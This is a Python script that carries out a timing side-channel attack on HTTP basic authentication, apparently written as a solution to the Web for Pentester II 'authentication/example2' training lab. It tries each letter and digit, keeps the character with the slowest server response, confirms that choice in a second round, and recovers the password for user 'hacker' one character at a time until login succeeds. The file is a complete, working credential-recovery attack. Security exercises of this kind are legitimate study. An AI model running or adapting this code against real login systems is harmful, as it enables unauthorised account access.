import requests, sys, string
from string import ascii_lowercase, digits

# Pseudo-code:
# 1) Loop through the list of ascii_lowercase and digits,
# 2) For each character, send a request and get the elapsed time for the response
# 3) Take the character that has that highest elapsed time and double check by going through the each character again
#    a) If the highest elapsed time is the same character, add it to password
#    b) If not the same, don't add password, re-do the run
# 4) Stopping condition is when the 200 response is sent back. Otherwise, continue when 401 is sent back


def fetch_request(url_to_connect, user_id, pwd):
    """
    Fetch request to the server to get a response back
    :param url_to_connect: (string) url to the server to connect to
    :param user_id: (string) id of an account
    :param pwd: (string) password of an account
    :return: (int) an integer if response's status code is 200, otherwise return (int) elapsed time of the response
    """
    response = requests.get(url_to_connect, auth=(user_id, pwd))
    if response.status_code == 200:
        return 200
    else:
        return response.elapsed.total_seconds()


def find_chars_with_highest_elapsed_time(search_list, url_to_connect, user_id, pwd):
    """
    Search for characters that has longest response time when connect to a server,
    :param search_list: (list) a list of characters to be searched
    :param url_to_connect: (string) url of a server to connect to
    :param user_id: (string) id of an account
    :param pwd: (string) password of an account
    :return: (list) a list contains 2 characters, each character is the highest elapsed time of a search round OR
             (list) a list contains the last character of a password with a 200 status code.
    """

    highest_list = []
    retries = 0

    # Loop 2 rounds. Round 2 is to double check the 1st round
    while retries < 2:

        highest_char = None
        highest_time = 0

        # For clarity purpose when running the program
        if retries == 1:
            print('\n---------Double-checking round!---------')

        # Check every character in the search_list
        for c in search_list:
            returned_result = fetch_request(url_to_connect, user_id, pwd + c)

            # During 1st round, if get a 200 status code then last char of pwd is found
            # Return immediately, no need to do a double-check round to save search time
            if returned_result == 200:
                highest_list.extend((c, returned_result))
                return highest_list
            # Find char with highest delay
            elif returned_result > highest_time:
                highest_time = returned_result
                highest_char = c
                print(f'Current highest: {highest_time} -> Char: {highest_char}')

            print(f'Trying {pwd + c}: {returned_result} Not authorized')

        print(f'\nRound {retries+1} highest: {highest_time} -> Char: {highest_char}')
        highest_list.append(highest_char)
        retries += 1

    return highest_list


def check_connection(url_to_connect):
    """
    Check connection to a server
    :param url_to_connect: (string) url to connect to a server
    :return: (boolean) True if successfully connected, False otherwise
    """
    try:
        connection = requests.get(url_to_connect, timeout=5)
    except requests.ConnectionError:
        print('No Internet Connection')
        return False
    if connection.status_code == 404:
        print('No Internet Connection')
        return False
    print('Successfully connected!')
    return True


# Root of the program. Everything starts here
def main():

    # Check user inputs
    if len(sys.argv) < 2 or len(sys.argv) > 2:
        print('Usage: python3 timing.py <url>')
        return

    wfp2_site = sys.argv[1]

    url = f'''http://{wfp2_site}/authentication/example2/'''

    # Check connection to the server
    if not check_connection(url):
        return

    password = ''

    list_to_search = list(ascii_lowercase + digits)

    done = False

    while not done:
        returned_highest_list = find_chars_with_highest_elapsed_time(list_to_search, url, 'hacker', password)

        print('Chars in list: ', returned_highest_list)

        # Terminate looping condition
        if returned_highest_list[1] == 200:
            password += returned_highest_list[0]
            done = True
            print('Password found!')
        # Check if the characters in the list match after 2 tries
        # Add the char to 'password' if both chars in the list are the same
        elif returned_highest_list[0] == returned_highest_list[1]:
            password += returned_highest_list[0]
            print('\nFound a character!')
            print('Current pass: ', password, '\n')
        else:
            print('\nCharacters don\'t match. Starting over!')
            print('Current pass: ', password, '\n')

    print('Complete pass: ', password)


if __name__ == '__main__':
    main()
